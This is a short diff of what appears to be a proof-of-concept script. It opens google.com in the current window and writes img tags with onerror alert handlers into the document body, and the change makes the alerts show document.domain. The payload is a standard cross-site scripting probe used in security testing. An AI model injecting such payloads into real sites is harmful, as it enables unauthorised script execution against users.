@@ -3,9 +3,9 @@
     x = open('https://www.google.com', '_top'),
     x.document.title = '', 
     x.document.body.innerHTML = 
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">'
+      '<img/src=\"\"onerror=\"alert(document.domain)\">' +
+      '<img/src=\"\"onerror=\"alert(document.domain)\">' +
+      '<img/src=\"\"onerror=\"alert(&quot;document.domain&quot;)\">'
    };
    setTimeout(y, 10);
 </script>
